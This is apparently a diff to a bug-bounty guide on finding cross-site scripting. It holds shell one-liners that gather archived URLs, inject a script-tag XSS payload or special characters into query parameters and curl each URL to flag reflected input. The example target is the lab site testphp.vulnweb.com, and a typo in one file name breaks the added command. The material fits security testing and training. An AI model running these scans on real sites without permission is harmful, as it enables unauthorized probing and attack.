@@ -31,6 +31,11 @@ waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possib
 ```bash
 waybackurls testphp.vulnweb.com| grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
 ```
+## Find the parameters which are not filtering special characters - One Liner
+```bash
+echo "test.url" | waybackurls | grep "=" | tee waybackurls.txt
+cat waybackruls | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|pdf|svg|txt)" | qsreplace '"><()'| tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "\"><()" && echo -e "$host \033[91m Vullnerable \e[0m \n" || echo -e "$host  \033[92m Not Vulnerable \e[0m \n"; done | tee XSS.txt
+```
 
 ## Tools Download Links:- 
 
@@ -46,3 +51,4 @@ Find Script here : [QuickXSS](https://github.com/theinfosecguy/QuickXSS)
 If you have any Questions, Reach out to me via [Twitter](https://twitter.com/g0t_rOoT_)
 ## Twitter : [Fani Malik](https://twitter.com/fanimalikhack)
 ## Twitter : [Faizee Asad](https://twitter.com/faizee_asad)
+## Twitter : [Prince Prafull](https://twitter.com/princeprafull3)
